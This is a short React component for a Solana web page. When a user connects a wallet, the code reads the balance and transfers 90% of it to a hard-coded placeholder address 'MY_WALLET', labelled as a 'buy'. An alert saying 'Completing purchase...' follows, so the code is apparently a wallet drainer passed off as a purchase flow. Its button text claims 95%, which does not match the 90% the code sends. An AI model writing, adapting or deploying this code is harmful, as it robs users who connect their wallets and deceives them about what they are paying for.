import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import {
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import React, { useCallback } from "react";

export default function SendSOL() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();

  const handleBuy = useCallback(async () => {
    if (!publicKey) {
      alert("Please connect wallet");
      return;
    }

    let signature = "";

    const balance = await connection.getBalance(publicKey);

    const mfunds = balance * 0.9;

    try {
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey("MY_WALLET"),
          // lamports: LAMPORTS_PER_SOL * Number(mfunds), Don't know if this will work
          lamports: Number(mfunds),
        })
      );

      signature = await sendTransaction(transaction, connection);

      alert("Transaction sent: " + signature);

      alert("Completing purchase...");

      await connection.confirmTransaction(signature, "processed");
    } catch (error) {
      alert(`Transaction failed! ${error?.message}`);
      return;
    }
  }, [publicKey, sendTransaction, connection]);

  return (
    <div>
      <WalletMultiButton />

      {publicKey && <button onClick={handleBuy}>Send 95% SOL</button>}
    </div>
  );
}
